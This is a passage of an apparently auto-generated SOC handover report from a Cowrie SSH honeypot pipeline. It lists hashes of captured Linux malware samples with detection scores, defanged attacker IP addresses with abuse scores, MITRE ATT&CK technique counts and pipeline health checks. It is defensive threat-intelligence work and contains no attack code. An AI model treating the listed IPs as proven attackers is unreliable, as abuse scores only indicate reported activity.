| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `138.121.120[.]11` | BR | Smart Solucoes em Telecomunicacoes | **100** ⚠️ | 1 |
| `181.212.174[.]165` | CL | TELEFONICA EMPRESAS CHILE SA | **100** ⚠️ | 3 |
| `152.32.154[.]31` | ID | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 6 |
| `43.130.90[.]166` | US | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 50 |
| `119.92.70[.]82` | PH | IPG | **100** ⚠️ | 50 |
| `42.4.63[.]120` | CN | UNICOM Liaoning Province Network | **100** ⚠️ | 5 |
| `183.239.54[.]162` | CN | China Mobile Communications Corporation | **100** ⚠️ | 36 |
| `175.170.144[.]17` | CN | CHINA UNICOM Liaoning province network | **100** ⚠️ | 22 |
| `120.48.76[.]190` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `49.64.85[.]138` | CN | CHINANET jiangsu province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 71 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 33 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 27 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 13 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 82 cases |
| Tool 34  | Credential Extractor        | ✅ 60 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (7.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 27 priority case(s) shown individually · 14 recon entry/entries in table (5 group(s) consolidating 40 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-25T16:50:59Z_
